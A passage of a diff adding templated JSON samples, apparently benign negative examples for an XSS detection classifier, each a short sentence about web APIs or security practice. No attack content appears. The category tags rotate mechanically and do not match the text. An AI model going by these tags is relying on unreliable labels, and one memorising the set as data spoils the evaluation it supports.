+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Table background is legacy HTML.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Div background-image is normal CSS usage.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Base64 encodes binary data safely when validated.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "eval is discouraged in JavaScript style guides.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "setTimeout schedules deferred work.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Promise.reject signals async failure.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "addEventListener registers DOM handlers.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "history.pushState updates URL without reload.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "location.href navigates the browser.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "open() opens a new browser tab.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Function constructor is rarely used in production.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Template literals use backticks in modern JS.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Comments use slash slash or block form.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Nonce attributes support content security policy.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Integrity attribute verifies subresource hash.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Crossorigin configures CORS for script tags.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Defer and async optimize script loading.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Unhandledrejection catches promise failures.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onbeforeunload warns before navigation.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onhashchange reacts to URL fragment updates.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onstorage syncs state across tabs.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onmessage handles postMessage between windows.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onkeydown detects keyboard input events.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onclick is the standard pointer click handler.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onsubmit validates forms before POST.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Oninput fires on each keystroke in inputs.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onchange fires when field value commits.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Oncopy/oncut/onpaste integrate with clipboard APIs.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onwheel handles scroll wheel events.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Oncontextmenu shows the native right-click menu.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onmouseenter/onmouseleave power hover UI.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onplay/onpause control HTML media elements.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onprogress tracks upload/download progress.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Onvolumechange adjusts audio slider UI.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Ontimeupdate updates video progress bar.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Canplaythrough indicates sufficient media buffer.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Loadedmetadata exposes media duration.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "We sanitize HTML with DOMPurify on the server.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "CSP blocks inline scripts by default.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Trusted Types enforce safe DOM sinks.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "HttpOnly cookies are not readable from JS.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "SameSite cookies reduce CSRF risk.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "X-XSS-Protection header is legacy.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Referrer-Policy limits leaked URLs.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Permissions-Policy restricts browser features.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Frame ancestors prevent clickjacking.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Subresource integrity pins CDN scripts.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Escape user HTML before rendering templates.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Use textContent instead of innerHTML when possible.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Validate URLs before assigning to href.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Allowlist protocols for redirect targets.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Markdown renderer disables raw HTML input.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Rich text editor strips script tags.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "WYSIWYG toolbar does not expose script insertion.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Email templates use plaintext fallback.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "PDF export escapes HTML entities.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "CSV export does not interpret formulas as commands.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "JSON API returns application/json only.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "GraphQL errors omit stack traces in prod.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Open redirect checks destination host.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Webhook URLs must be HTTPS in production.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "OAuth redirect URI must match registered value.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "JWT stored in memory not localStorage.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Refresh token rotation reduces replay window.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "CSRF token required on state-changing forms.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Double submit cookie pattern validates POST.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Rate limiting protects login endpoint.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Account lockout after failed attempts.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "CAPTCHA on suspicious traffic only.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Bot detection uses behavioral signals.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "WAF rules complement application validation.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Security headers set on every response.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "HSTS preload list submission planned.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "TLS 1.3 enforced on public endpoints.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Certificate transparency monitors issuance.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Dependency scanning runs in CI pipeline.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "SAST finds dangerous sinks in PR diffs.",
+    "label": "benign",
+    "category": "benign_html_tag",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "DAST scans staging weekly.",
+    "label": "benign",
+    "category": "benign_word_script",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Pen test findings tracked in issue board.",
+    "label": "benign",
+    "category": "benign_word_javascript",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Bug bounty program accepts responsible disclosure.",
+    "label": "benign",
+    "category": "benign_words",
+    "source": "template-xss-benign"
+  },
+  {
+    "text": "Incident response runbook is tested quarterly.",
+    "label": "benign",
+    "category": "benign_markdown",
+    "source": "template-xss-benign"
+  }
+]
